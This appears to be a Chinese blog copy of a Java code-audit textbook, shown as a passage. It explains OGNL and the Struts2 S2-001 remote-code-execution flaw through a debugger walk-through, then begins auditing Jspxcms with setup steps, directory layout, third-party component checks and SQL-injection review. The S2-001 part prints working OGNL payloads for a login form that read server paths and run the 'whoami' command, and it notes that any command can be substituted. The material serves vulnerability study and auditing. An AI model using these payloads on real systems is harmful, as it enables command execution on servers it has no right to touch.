开发框架使用不当范例（Struts2 远程代码执行）"></a>7.2　开发框架使用不当范例（Struts2 远程代码执行）</h2><p>自Struts2在2007年爆出第一个远程代码执行漏洞 S2-001以来，在其后续的发展过程中不断爆出更多而且危害更大的远程代码执行漏洞，而造成Struts2这么多RCE漏洞的主要原因就是OGNL表达式。这里以Struts2的第一个漏洞S2-001为例来对Struts2远程代码执行漏洞进行初步介绍。</p><h3 id="7-2-1-OGNL简介"><a href="#7-2-1-OGNL简介" class="headerlink" title="7.2.1　OGNL简介"></a>7.2.1　OGNL简介</h3><p>首先来了解OGNL表达式，OGNL（Object Graphic NavigatinoLanguage）的中文全称为“对象图导航语言”，下面先通过一个简单的案例来描述其作用。</p><p>首先定义一个Student类，该类有3个属性name、studentNumber和theClass，同时为3个属性编写get和set方法，如图7-82所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021835963.png" alt="image-20220502183501447"></p><p>图7-82　为3个属性编写get和set方法</p><p>然后定义一个TheClass类，该类有两个属性：className和school，同样也为两个属性编写get和set方法，如图7-83所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021836881.png" alt="image-20220502183626741"></p><p>图7-83　为两个属性编写get和set方法</p><p>最后定义一个School类，该类只有一个属性schoolName，如图7-84所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021836748.png" alt="image-20220502183650623"></p><p>图7-84　 schoolName属性</p><p>通过如下操作将这3个类实例化并为其属性一一进行赋值，最后通过使用OGNL表达式的方式取出指定的值，如图7-85所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021839422.png" alt="image-20220502183910280"></p><p>图7-85　实例化3个类并为其赋值</p><p>在不使用OGNL表达式的情况下，如果要取出schoolName属性，需要通过调用对应的get方法，但是当我们使用OGNL的&#x3D;&#x3D;getValue&#x3D;&#x3D;，&#x3D;&#x3D;只需要传递一个OGNL表达式和根节点&#x3D;&#x3D;就可以取出指定对象的属性，非常方便。</p><h3 id="7-2-2-S2-001漏洞原理分析"><a href="#7-2-2-S2-001漏洞原理分析" class="headerlink" title="7.2.2　S2-001漏洞原理分析"></a>7.2.2　S2-001漏洞原理分析</h3><p>初次了解一个漏洞的原理，除了查看网络上相关的漏洞分析文章以外，最重要的一点就是一定要自己调试。</p><p>首先导入存在漏洞的Jar包。</p><p>部署一下环境 <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021926773.png" alt="image-20220502192654634"></p><h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>在登录失败的时候可以看到，会将错误的 username 和 password 显示在输入框中 <img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220502193257297.png" alt="image-20220502193257297"></p><p>然而当我们在密码框处输入这样一个字符串时 %{1+1} （ % 需编码）会被解析成2 </p><p>从而利用这一特性，可以构造一些命令执行语句</p><p>获取tomcat路径</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">%&#123;<span class="hljs-string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="hljs-meta">@java</span>.lang.System<span class="hljs-meta">@getProperty</span>(<span class="hljs-string">&quot;user.dir&quot;</span>)+<span class="hljs-string">&quot;&#125;&quot;</span>&#125; <br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021935066.png" alt="image-20220502193454299">获取web路径 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">%&#123;#req=<span class="hljs-meta">@org</span>.apache.struts2.ServletActionContext<span class="hljs-meta">@getRequest()</span>,#response=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="hljs-string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021937387.png" alt="image-20220502193712742">以及命令执行 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">%&#123;#a=(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String[]&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="hljs-literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(#b)<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021937892.png" alt="image-20220502193746869">将其中的 java.lang.String[]{“whoami”} 修改一下就可以执行任意命令 </p><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>可以锁定到最终变量值发生变化的区域是在</p><p> &#x3D;&#x3D;xwork 2.0.3.jar!&#x2F;com&#x2F;opensymphony&#x2F;xwork2&#x2F;util&#x2F;TextParseUtil.class:30 line&#x3D;&#x3D; 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">translateVariables</span><span class="hljs-params">(<span class="hljs-type">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> &#123;<br><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> expression;<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> expression.indexOf(open + <span class="hljs-string">&quot;&#123;&quot;</span>);<br><span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> expression.length();<br><span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> start + <span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span>(start != -<span class="hljs-number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> expression.charAt(x++);<br><span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>++count;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&#125;&#x27;</span>) &#123;<br>--count;<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> x - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (start == -<span class="hljs-number">1</span> || end == -<span class="hljs-number">1</span> || count != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);<br>&#125;<br><span class="hljs-type">String</span> <span class="hljs-variable">var</span> <span class="hljs-operator">=</span> expression.substring(start + <span class="hljs-number">2</span>, end);<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> stack.findValue(<span class="hljs-keyword">var</span>, asType);<br><span class="hljs-keyword">if</span> (evaluator != <span class="hljs-literal">null</span>) &#123;<br>o = evaluator.evaluate(o);<br>&#125;<br><span class="hljs-type">String</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> expression.substring(<span class="hljs-number">0</span>, start);<br><span class="hljs-type">String</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> expression.substring(end + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (o != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (TextUtils.stringSet(left)) &#123;<br>result = left + o;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>result = o;<br>&#125;<br><span class="hljs-keyword">if</span> (TextUtils.stringSet(right)) &#123;<br>result = result + right;<br>&#125;<br>expression = left + o + right;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>result = left + right;<br>expression = left + right;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在此处下了断点之后，可以看到 </p><p>依次进入了好几次，不同时候的 expression 的值都会有所不同，我们找到值为 password 时开始分析 <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021946994.png" alt="image-20220502194656852"></p><p>经过两次如下代码之后，将其生成了OGNL表达式，返回了 %{password} </p><p><strong>return</strong> XWorkConverter**.<strong>getInstance</strong>().<strong>convertValue</strong>(<strong>stack</strong>.<strong>getContext</strong>(),** result**,** asType**);** <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205022003945.png" alt="image-20220502195652341"></p><p>然后这次的判断跳过了中间的return，来到后面，取出 %{password} 中间的值 password 赋给 var <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205022005861.png" alt="image-20220502200303882"></p><p>然后通过 &#x3D;&#x3D;Object o &#x3D; stack.findValue(var, asType)&#x3D;&#x3D; 获得到password的值为 &#x3D;&#x3D;%{1+1}&#x3D;&#x3D; </p><p>然后重新赋值给expression，进行下一次循环<img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220502200542254.png" alt="image-20220502200542254"></p><p>在这一次循环的时候，就再次解析了 %{1+1} 这个OGNL表达式，并将其赋值给了 o <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205022008609.png" alt="image-20220502200837029"></p><p>最后 expression 的值就变成了2，不是OGNL表达式时就会进入 </p><p><strong>return</strong> XWorkConverter**.<strong>getInstance</strong>().<strong>convertValue</strong>(<strong>stack</strong>.<strong>getContext</strong>(),** result**,** asType**);** </p><h1 id="第8章-Jspxcms代码审计实战"><a href="#第8章-Jspxcms代码审计实战" class="headerlink" title="第8章　Jspxcms代码审计实战"></a>第8章　Jspxcms代码审计实战</h1><h2 id="8-1-Jspxcms简介"><a href="#8-1-Jspxcms简介" class="headerlink" title="8.1　Jspxcms简介"></a>8.1　Jspxcms简介</h2><p>Jspxcms是灵活的、易扩展的开源网站内容管理系统，具有可独立管理的站群、自定义模型、自定义工作流、控制浏览权限、支持全文检索、多种内容形式、支持文库功能、支持手机站、支持微信群发、可查询字段、文章多栏目、文章多属性、内容采集、附件管理、全站静态化等功能特点，是在gitee开源平台获得推荐标志的优秀Java项目</p><p>Jspxcms的前端技术主要运用了HTML 5、CSS、JavaScript、jQuery、jQuery Validate（验证框架）、jQuery UI、AdminLTE、Bootstrap（响应式CSS框架）、UEditor（Web编辑器）、Editor.md（Markdown编辑器）、SWFUpload（上传组件）、My97 DatePicker（日期控件）、zTree（树控件）等，后端技术主要运用了Spring Boot、Spring、Spring MVC、JPA（Java持久层API）、Hibernate（JPA实现）、Spring-Data-JPA、QueryDSL、Shiro（安全框架）、Ehcache（缓存框架）、Lucene（全文检索引擎）、IKAnalyzer（中文分词组件）、Quartz（定时任务组件）、Tomcat JDBC（连接池）、Logback（日志组件）、JCaptcha（验证码组件）、JSP、JSTL（JSP标准标签库）、FreeMarker（模板引擎）、Maven等。</p><h2 id="8-2-Jspxcms的安装"><a href="#8-2-Jspxcms的安装" class="headerlink" title="8.2　Jspxcms的安装"></a>8.2　Jspxcms的安装</h2><h3 id="8-2-1-Jspxcms的安装环境需求"><a href="#8-2-1-Jspxcms的安装环境需求" class="headerlink" title="8.2.1　Jspxcms的安装环境需求"></a>8.2.1　Jspxcms的安装环境需求</h3><p>JDK 8或更高版本。Servlet 3.0或更高版本（如Tomcat7或更高版本）。MySQL 5.5或更高版本（如需使用MySQL 5.0，可将MySQL驱动版本替换为5.1.24）；Oracle 10g或更高版本；SQL Server 2005或更高版本。Maven 3.2或更高版本。系统后台兼容的浏览器：IE 9+、Edge、Firefox、Chrome。前台页面兼容的浏览器取决于模板，使用者可以完全控制模板，理论上可以支持任何浏览器。以上为安装 Jspxcms 的基础环境，此外，我们审计的 Jspxcms版本为 v9.0.0 版本，使用的数据库版本为 8.0.15，使用的审计工具为 IntelliJ IDEA 2020.1.4。</p><h3 id="8-2-2-Jspxcms的安装步骤"><a href="#8-2-2-Jspxcms的安装步骤" class="headerlink" title="8.2.2　Jspxcms的安装步骤"></a>8.2.2　Jspxcms的安装步骤</h3><p>首先下载源码，并将其解压，重命名为 cms，得到其主目录，如图8-1所示。</p><p>然后创建名为jspxcms_test的数据库，并导入该 SQL 文件，如图8-2所示。</p><p>接着打开IDEA，选择Open or Import，导入Jspxcms项目，如图8-3所示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205022055960.png" alt="image-20220502205456892">图8-1　Jspxcms主目录</p><p>导入项目后的主界面如图8-4所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205022113923.png" alt="image-20220502211335234"></p><p>图8-4　导入项目后的主界面</p><p>再打开&#x2F;src&#x2F;main&#x2F;resources&#x2F;application.propertis文件，修改url、username、password的值，其余保持默认即可，如图8-5所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205022116119.png" alt="image-20220502211621102"></p><p>图8-5　数据库信息配置界面</p><p>配置文件修改好后，继续修改pom.xml文件，将部分中间件版本修改成我们本机环境所安装的版本。如我这里的 MySQL 版本是 8.0.15，因此将pom.xml文件中的MySQL 版本修改成 8.0.15，</p><p>修改好后保存文件，然后右击项目名称，选择 Add Framework Support…选项，如图8-7所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205022121603.png" alt="image-20220502212128048"></p><p>接着在左侧选项栏中选择 Maven，单击OK按钮，如图8-8 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205022121742.png" alt="image-20220502212155590"></p><p>图8-8　选择Maven</p><p>系统会在External Libraries下自动下载对应的 Jar 包，如图8-9 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205022123281.png" alt="image-20220502212306123"></p><p>图8-9　自动下载对应的Jar包</p><p>当 Jar 包完成下载后，在 Idea 的右上角单击 Application→Edit Configurations…选项，如图8-10 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205022124939.png" alt="image-20220502212418805"></p><p>图8-10　单击Edit Configurations…选项</p><p>在Environment 选项中选择相应的JDK版本，如图8-11所示。</p><p>单击OK按钮后，项目即可运行成功<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205022124482.png" alt="image-20220502212433329"></p><p>图8-11　选择JDK版本</p><p>启动运行</p><h2 id="8-3-目录结构及功能说明"><a href="#8-3-目录结构及功能说明" class="headerlink" title="8.3　目录结构及功能说明"></a>8.3　目录结构及功能说明</h2><p>了解所审计项目的目录结构和功能，能够使我们有针对性地猜测某些功能可能出现的漏洞，然后再进行深入挖掘。此外，了解目录结构也能够方便我们寻找对应代码中的审计点。</p><h3 id="8-3-1-目录结构"><a href="#8-3-1-目录结构" class="headerlink" title="8.3.1　目录结构"></a>8.3.1　目录结构</h3><p>Jspxcms的目录结构分为3个主文件夹，分别为java、resource和webapp。java文件夹中主要存放Java源码，resource 文件夹主要存放配置文件，webapp 文件主要存放JSP文件以及静态资源文件</p><p>java 文件夹存放的主要文件及作用如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs javascript">com.<span class="hljs-property">jspxcms</span>.<span class="hljs-property">common</span>：主要存放公用组件代码。<br>captcha：验证码生成的相关逻辑代码。<br>freemarker：<span class="hljs-title class_">FreeMarker</span>模板处理的逻辑代码。<br>fulltext：全文索引的逻辑代码。<br>ip：通过<span class="hljs-variable constant_">IP</span>地址查询实际地址的逻辑代码。<br>office：<span class="hljs-title class_">Word</span>转html的逻辑代码。<br>orm：对象关系映射代码，主要存放<span class="hljs-variable constant_">JPA</span>及<span class="hljs-title class_">SpringDataJPA</span>相关辅助类。<br>security：安全防护相关的逻辑代码。<br>upload：上传相关的逻辑代码。<br>util：工具类。<br>web：<span class="hljs-title class_">Spring</span> <span class="hljs-variable constant_">MVC</span>等<span class="hljs-title class_">Web</span>相关类。<br>com.<span class="hljs-property">jspxcms</span>.<span class="hljs-property">core</span>：主要存放站点功能的核心模块代码。<br>commercial：商业版中提供的一些功能。<br>constant：静态变量定义。<br>domain：实体类代码。<br>fulltext：全文索引的逻辑代码。<br>holder：获取菜单以及模型列表的逻辑代码。<br>html：生成静态页的代码。<br>listener：监听器的代码。<br>quartz：定时器的逻辑代码。<br>repository：数据库持久化层的代码。<br>security：安全防护相关的逻辑代码。<br>service：服务层的代码。<br>support：支持类的代码。<br>web：<span class="hljs-title class_">Controller</span>层的代码。<br>back：后台<span class="hljs-title class_">Controller</span>的代码。<br>directive：<span class="hljs-title class_">FreeMarker</span>标签的代码。<br>fore：前台<span class="hljs-title class_">Controller</span>的代码。<br>method：<span class="hljs-title class_">FreeMarker</span>方法的代码。<br>com.<span class="hljs-property">jspxcms</span>.<span class="hljs-property">ext</span>：扩展模块的代码。<br>com.<span class="hljs-property">jspxcms</span>.<span class="hljs-property">com</span>：插件模块的代码。<br>resource文件夹存放的主要文件及作用如下。<br>conf：主要存放各种类型的配置文件。<br>core：核心模块的配置文件。<br>plugin.<span class="hljs-property">plug</span>：插件模块的配置文件。<br>conf.<span class="hljs-property">properties</span>：系统properties的配置文件。<br>context.<span class="hljs-property">xml</span> spring：context的配置文件。<br>context-quartz.<span class="hljs-property">xml</span>：定时任务的配置文件。<br>menu.<span class="hljs-property">yml</span>：后台菜单的配置文件。<br>spring.<span class="hljs-property">jpa</span>.<span class="hljs-property">propertis</span>：<span class="hljs-title class_">Spring</span> <span class="hljs-variable constant_">JPA</span>的配置文件。<br>ehcache：ehcache缓存的配置文件。<br>messages：国际化的文件。<br>application.<span class="hljs-property">properties</span>：<span class="hljs-title class_">Spring</span> <span class="hljs-title class_">Boot</span>的配置文件。<br>config.<span class="hljs-property">properties</span>：微博第三方登录的配置文件。<br>custom.<span class="hljs-property">xml</span>：验证码、全文索引的配置文件。<br><span class="hljs-title class_">IKAnalyzer</span>.<span class="hljs-property">cfg</span>.<span class="hljs-property">xml</span>：<span class="hljs-variable constant_">IK</span> <span class="hljs-title class_">Analyzer</span>的配置文件。<br>qqconnectconfig.<span class="hljs-property">properties</span>：<span class="hljs-variable constant_">QQ</span>第三方登录的配置文件。qqwry.<span class="hljs-property">dat</span>：<span class="hljs-variable constant_">IP</span>地址数据库。<br>quartz.<span class="hljs-property">properties</span>：定时任务的配置文件。<br>stopword.<span class="hljs-property">dic</span>：<span class="hljs-variable constant_">IK</span> <span class="hljs-title class_">Analyzer</span>停止词的文件。<br>stopword_ext.<span class="hljs-property">dic</span>：<span class="hljs-variable constant_">IK</span> <span class="hljs-title class_">Analyzer</span>停止词的扩展文件。<br>weixin.<span class="hljs-property">properties</span>：微信的配置文件。<br></code></pre></td></tr></table></figure><p>webapp文件夹存放的主要文件及作用如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript">sp：主要存放单独的<span class="hljs-variable constant_">JSP</span>页面文件。<br><span class="hljs-keyword">static</span>：主要存放静态资源文件。<br><br>css：主要存放<span class="hljs-variable constant_">CSS</span>文件。<br>img：主要存放图片文件。<br>js：主要存放<span class="hljs-variable constant_">JS</span>文件。<br>vendor：主要存放第三方组件库。<br>如jQuery、bootstrop、<span class="hljs-title class_">UEditor</span>、zTree、<span class="hljs-title class_">My97DatePicker</span>等。<br>template：主要存放前台<span class="hljs-title class_">FreeMarker</span>的模板文件。<br>uploads：主要存放上传的文件。<br><span class="hljs-variable constant_">WEB</span>-<span class="hljs-variable constant_">INF</span>。<br><br>fulltext <span class="hljs-title class_">Lucene</span>：全文检索的文件目录。<br>lib：第三方组件<span class="hljs-title class_">Jar</span>包。<br>tags：后台<span class="hljs-variable constant_">JSP</span>标签。<br>tlds：<span class="hljs-variable constant_">JSTL</span> functions。<br>views：主要存放后台的<span class="hljs-variable constant_">JSP</span>页面。<br>commons：部分公用的<span class="hljs-variable constant_">JSP</span>页面。<br>core：核心模块的<span class="hljs-variable constant_">JSP</span>页面。<br>error：发生异常时显示的<span class="hljs-variable constant_">JSP</span>页面。<br>ext：扩展模块的<span class="hljs-variable constant_">JSP</span>页面。<br>plug：插件模块的<span class="hljs-variable constant_">JSP</span>页面。<br>index.<span class="hljs-property">jsp</span>：后台首页框架页。<br>login.<span class="hljs-property">jsp</span>：后台登录的页面。<br>weblogic.<span class="hljs-property">xml</span>：用于部署在<span class="hljs-title class_">WebLogic</span>的配置文件。<br>crossdomain.<span class="hljs-property">xml</span>：跨域策略的配置文件。<br>favicon.<span class="hljs-property">ico</span>：浏览器头部图标。<br></code></pre></td></tr></table></figure><p>以上为 Jspxcms的主要目录结构及文件说明。</p><h3 id="8-3-2-功能说明"><a href="#8-3-2-功能说明" class="headerlink" title="8.3.2　功能说明"></a>8.3.2　功能说明</h3><p>Jspxcms 的功能主要有工作台功能、内容管理功能、文件管理功能、模块组件功能、插件功能、访问统计功能、用户权限功能、系统管理功能等。</p><p>工作台的主要功能如下。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs armasm">后台首页：显示当前系统的版本信息、用户名、上次登录时间、上次登录<span class="hljs-built_in">IP</span>、登录次数等信息。<br>系统信息：显示当前操作系统、Java运行环境、系统用户、用户主目录、用户临时目录、最大内存、已用内存、可用内存等信息。<br>我的通知：通知消息。<br>我的私信：私信消息。<br>系统消息：系统消息。<br>密码修改：修改当前用户的登录密码。<br><br></code></pre></td></tr></table></figure><p>内容管理功能主要如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205032200680.png" alt="image-20220503220017835"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205032200501.png" alt="image-20220503220057363"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205032201254.png" alt="image-20220503220112110"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205032201508.png" alt="image-20220503220125358"></p><p>访问统计主要功能如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205032201355.png" alt="image-20220503220146193"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205032202671.png" alt="image-20220503220154659"></p><p>系统管理主要功能如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205032202942.png" alt="image-20220503220223812"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205032202176.png" alt="image-20220503220241027"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205032202100.png" alt="image-20220503220249961"></p><h2 id="8-4-第三方组件漏洞审计"><a href="#8-4-第三方组件漏洞审计" class="headerlink" title="8.4　第三方组件漏洞审计"></a>8.4　第三方组件漏洞审计</h2><p>对于早期的 Java Web项目，如果使用了其他官方或组织提供的Jar包，那么我们需要手动将对应的Jar包复制到对应的 lib 目录并配置对应信息。如果一个项目使用了大量的中间件，则会增加维护成本，但是也利于其他用户部署该项目。Apache为了解决这个问题编写了Maven，它是一款基于Java平台，可用于项目构建、依赖管理和项目信息管理的工具，使用该功能能够大大减少维护成本，并且Maven规范了团队以相同的方式进行项目管理，无形中提升了团队的工作效率。</p><p>Maven 的核心文件是pom.xml，该文件主要用于管理源代码、配置文件、开发者的信息和角色、问题追踪、组织信息、项目授权、项目的url、项目的依赖关系等。甚至可以说，对于一个Maven项目，其project可以没有任何代码，但是必须包含pom.xml文件。</p><p>因此对于审计者来说，&#x3D;&#x3D;在审计第三方组件的漏洞时，首先需要翻阅 pom.xml文件&#x3D;&#x3D;，该文件中记录着这个项目使用的第三方组件及其版本号。</p><p>表8-1　Jspxcms 使用的第三方组件及其版本号<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051245859.png" alt="image-20220505124532705"></p><p>我们可以对所使用的Jspxcms的第三方组件的版本进行版本比对，以判断该版本是否受到已知漏洞的影响。以第三方组件shiro为例，我们可以通过业界的安全通报得知它受到了RCE漏洞的影响，如图8-17所示，这为CMS带来了严重的安全风险。具体分析过程请参阅8.5.4节。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051245592.png" alt="image-20220505124554408"></p><p>图8-17　第三方组件shiro受到RCE漏洞的影响</p><h2 id="8-5-单点漏洞审计"><a href="#8-5-单点漏洞审计" class="headerlink" title="8.5　单点漏洞审计"></a>8.5　单点漏洞审计</h2><h3 id="8-5-1-SQL审计"><a href="#8-5-1-SQL审计" class="headerlink" title="8.5.1　SQL审计"></a>8.5.1　SQL审计</h3><h4 id="1．全局搜索"><a href="#1．全局搜索" class="headerlink" title="1．全局搜索"></a>1．全局搜索</h4><p>根据pom.xml文件可以得知，这套CMS使用了Hibernate作为数据库持久化框架，5.1节曾介绍过在某些未正确使用Hibernate框架的情况下会产生SQL注入漏洞。用户可以通过全局搜索关键字“query”快速寻找可能存在的漏洞点，如图8-18所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051252886.png" alt="image-20220505125243735"></p><p>图8-18　通过全局搜索关键字寻找可能存在的漏洞点</p><p>如下代码使用了占位符的方式构造了SQL语句，这种方式是不会产生SQL注入的。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051257471.png" alt="image-20220505125739324"></p><h4 id="2．功能定点审计"><a href="#2．功能定点审计" class="headerlink" title="2．功能定点审计"></a>2．功能定点审计</h4><h5 id="（1）用户信息"><a href="#（1）用户信息" class="headerlink" title="（1）用户信息"></a>（1）用户信息</h5><p>我们可以从程序的具体功能上进行定点的漏洞挖掘，与数据库交互的位置就有可能出现SQL注入，比如用户信息页面，如图8-19所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051258574.png" alt="image-20220505125809410"></p><p>图8-19　用户信息页面</p><p>根据路由信息info&#x2F;1，可以定位到程序代码在控制器core.web.fore.InfoController#info中。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205051258355.png" alt="image-20220505125852190"></p><p>具体的功能逻辑代码实现在info（）方法中，但此时已经可以判断此处不存在注入。因为Java是强类型语言，id需要是数字，不能是字符串，所以此处不存在SQL注入。</p><h5 id="（2）用户名检查。"><a href="#（2）用户名检查。" class="headerlink" 